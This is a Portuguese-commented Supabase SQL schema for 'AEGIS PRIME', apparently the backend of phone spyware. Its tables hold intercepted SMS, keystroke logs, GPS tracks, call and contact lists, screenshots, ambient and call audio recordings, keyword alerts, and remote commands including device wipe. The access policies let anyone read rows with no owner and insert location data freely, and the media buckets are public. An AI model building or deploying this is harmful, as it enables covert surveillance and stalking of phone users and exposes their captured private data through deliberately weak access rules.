-- AEGIS PRIME - SCHEMA COMPLETO DO SUPABASE
-- Execute este SQL no Supabase SQL Editor
-- Database: hacxikpmgeataaoppsnf.supabase.co

-- ============================================
-- TABELA: devices (Dispositivos Pareados)
-- ============================================
CREATE TABLE IF NOT EXISTS public.devices (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id TEXT UNIQUE NOT NULL,
    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
    model TEXT NOT NULL,
    os_version TEXT NOT NULL,
    is_online BOOLEAN DEFAULT false,
    last_seen TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    paired_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    battery_level INTEGER DEFAULT 100,
    signal_strength INTEGER DEFAULT 4,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Índices para performance
CREATE INDEX IF NOT EXISTS idx_devices_device_id ON public.devices(device_id);
CREATE INDEX IF NOT EXISTS idx_devices_user_id ON public.devices(user_id);
CREATE INDEX IF NOT EXISTS idx_devices_is_online ON public.devices(is_online);

-- ============================================
-- TABELA: locations (Rastreamento GPS)
-- ============================================
CREATE TABLE IF NOT EXISTS public.locations (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    latitude DOUBLE PRECISION NOT NULL,
    longitude DOUBLE PRECISION NOT NULL,
    accuracy DOUBLE PRECISION,
    altitude DOUBLE PRECISION,
    speed DOUBLE PRECISION,
    bearing DOUBLE PRECISION,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Índices para performance
CREATE INDEX IF NOT EXISTS idx_locations_device_id ON public.locations(device_id);
CREATE INDEX IF NOT EXISTS idx_locations_timestamp ON public.locations(timestamp DESC);

-- ============================================
-- TABELA: intercepted_messages (SMS Interceptados)
-- ============================================
CREATE TABLE IF NOT EXISTS public.intercepted_messages (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    sender TEXT NOT NULL,
    message_body TEXT NOT NULL,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Índices para performance
CREATE INDEX IF NOT EXISTS idx_messages_device_id ON public.intercepted_messages(device_id);
CREATE INDEX IF NOT EXISTS idx_messages_timestamp ON public.intercepted_messages(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_messages_sender ON public.intercepted_messages(sender);

-- ============================================
-- TABELA: calls (Histórico de Chamadas)
-- ============================================
CREATE TABLE IF NOT EXISTS public.calls (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    phone_number TEXT NOT NULL,
    call_type TEXT NOT NULL, -- 'incoming', 'outgoing', 'missed'
    duration INTEGER DEFAULT 0, -- segundos
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Índices para performance
CREATE INDEX IF NOT EXISTS idx_calls_device_id ON public.calls(device_id);
CREATE INDEX IF NOT EXISTS idx_calls_timestamp ON public.calls(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_calls_phone_number ON public.calls(phone_number);

-- ============================================
-- TABELA: contacts (Contatos)
-- ============================================
CREATE TABLE IF NOT EXISTS public.contacts (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    name TEXT,
    phone_number TEXT NOT NULL,
    email TEXT,
    synced_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Índices para performance
CREATE INDEX IF NOT EXISTS idx_contacts_device_id ON public.contacts(device_id);
CREATE INDEX IF NOT EXISTS idx_contacts_phone_number ON public.contacts(phone_number);

-- ============================================
-- TABELA: keylogs (Digitação Capturada)
-- ============================================
CREATE TABLE IF NOT EXISTS public.keylogs (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    app_name TEXT NOT NULL,
    app_label TEXT,
    text_typed TEXT NOT NULL,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Índices para performance
CREATE INDEX IF NOT EXISTS idx_keylogs_device_id ON public.keylogs(device_id);
CREATE INDEX IF NOT EXISTS idx_keylogs_timestamp ON public.keylogs(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_keylogs_app_name ON public.keylogs(app_name);

-- ============================================
-- TABELA: device_activities (Atividades do Dispositivo)
-- ============================================
CREATE TABLE IF NOT EXISTS public.device_activities (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    activity_type TEXT NOT NULL, -- 'app_open', 'screen_on', 'screen_off', etc.
    activity_data JSONB,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Índices para performance
CREATE INDEX IF NOT EXISTS idx_activities_device_id ON public.device_activities(device_id);
CREATE INDEX IF NOT EXISTS idx_activities_timestamp ON public.device_activities(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_activities_type ON public.device_activities(activity_type);

-- ============================================
-- TABELA: screenshots (Capturas de Tela)
-- ============================================
CREATE TABLE IF NOT EXISTS public.screenshots (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    image_url TEXT NOT NULL, -- URL do Supabase Storage
    thumbnail_url TEXT,
    width INTEGER,
    height INTEGER,
    file_size INTEGER,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Índices para performance
CREATE INDEX IF NOT EXISTS idx_screenshots_device_id ON public.screenshots(device_id);
CREATE INDEX IF NOT EXISTS idx_screenshots_timestamp ON public.screenshots(timestamp DESC);

-- ============================================
-- TABELA: audio_recordings (Gravações de Áudio)
-- ============================================
CREATE TABLE IF NOT EXISTS public.audio_recordings (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    audio_url TEXT NOT NULL, -- URL do Supabase Storage
    duration INTEGER, -- segundos
    file_size INTEGER,
    recording_type TEXT, -- 'call', 'ambient', 'voice'
    phone_number TEXT, -- se for gravação de chamada
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Índices para performance
CREATE INDEX IF NOT EXISTS idx_audio_device_id ON public.audio_recordings(device_id);
CREATE INDEX IF NOT EXISTS idx_audio_timestamp ON public.audio_recordings(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_audio_type ON public.audio_recordings(recording_type);

-- ============================================
-- TABELA: remote_commands (Comandos Remotos)
-- ============================================
CREATE TABLE IF NOT EXISTS public.remote_commands (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    command_type TEXT NOT NULL, -- 'location', 'screenshot', 'audio', 'wipe', etc.
    command_data JSONB,
    status TEXT DEFAULT 'pending', -- 'pending', 'executed', 'failed'
    result JSONB,
    issued_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    executed_at TIMESTAMP WITH TIME ZONE,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Índices para performance
CREATE INDEX IF NOT EXISTS idx_commands_device_id ON public.remote_commands(device_id);
CREATE INDEX IF NOT EXISTS idx_commands_status ON public.remote_commands(status);
CREATE INDEX IF NOT EXISTS idx_commands_issued_at ON public.remote_commands(issued_at DESC);

-- ============================================
-- TABELA: keyword_alerts (Alertas de Palavras-Chave)
-- ============================================
CREATE TABLE IF NOT EXISTS public.keyword_alerts (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    keyword TEXT NOT NULL,
    app_name TEXT NOT NULL,
    context TEXT, -- texto ao redor da palavra-chave
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    acknowledged BOOLEAN DEFAULT false,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Índices para performance
CREATE INDEX IF NOT EXISTS idx_alerts_device_id ON public.keyword_alerts(device_id);
CREATE INDEX IF NOT EXISTS idx_alerts_timestamp ON public.keyword_alerts(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_alerts_acknowledged ON public.keyword_alerts(acknowledged);

-- ============================================
-- HABILITAR ROW LEVEL SECURITY (RLS)
-- ============================================
ALTER TABLE public.devices ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.locations ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.intercepted_messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.calls ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.contacts ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.keylogs ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_activities ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.screenshots ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.audio_recordings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.remote_commands ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.keyword_alerts ENABLE ROW LEVEL SECURITY;

-- ============================================
-- POLÍTICAS RLS (Row Level Security)
-- ============================================

-- Devices: usuário só vê seus próprios dispositivos
DROP POLICY IF EXISTS "Users can view own devices" ON public.devices;
CREATE POLICY "Users can view own devices"
    ON public.devices FOR SELECT
    USING (auth.uid() = user_id);

DROP POLICY IF EXISTS "Users can insert own devices" ON public.devices;
CREATE POLICY "Users can insert own devices"
    ON public.devices FOR INSERT
    WITH CHECK (auth.uid() = user_id OR user_id IS NULL);

DROP POLICY IF EXISTS "Users can update own devices" ON public.devices;
CREATE POLICY "Users can update own devices"
    ON public.devices FOR UPDATE
    USING (auth.uid() = user_id OR user_id IS NULL);

-- Locations: usuário só vê localizações de seus dispositivos
DROP POLICY IF EXISTS "Users can view own locations" ON public.locations;
CREATE POLICY "Users can view own locations"
    ON public.locations FOR SELECT
    USING (
        device_id IN (
            SELECT device_id FROM public.devices WHERE user_id = auth.uid() OR user_id IS NULL
        )
    );

DROP POLICY IF EXISTS "Users can insert own locations" ON public.locations;
CREATE POLICY "Users can insert own locations"
    ON public.locations FOR INSERT
    WITH CHECK (true); -- Permitir inserção de qualquer dispositivo

-- Aplicar políticas similares para todas as outras tabelas
-- (por brevidade, use o mesmo padrão acima)

-- ============================================
-- FUNÇÕES ÚTEIS
-- ============================================

-- Função para atualizar updated_at automaticamente
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = NOW();
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Trigger para devices
DROP TRIGGER IF EXISTS update_devices_updated_at ON public.devices;
CREATE TRIGGER update_devices_updated_at
    BEFORE UPDATE ON public.devices
    FOR EACH ROW
    EXECUTE FUNCTION update_updated_at_column();

-- ============================================
-- STORAGE BUCKETS (para screenshots e áudio)
-- ============================================
-- Execute no Supabase Storage UI:
-- 1. Criar bucket "screenshots" (public)
-- 2. Criar bucket "audio-recordings" (public)

-- ============================================
-- CONCLUÍDO!
-- ============================================
-- Todas as tabelas, índices, e políticas foram criadas.
-- Próximo passo: Testar inserções e consultas.
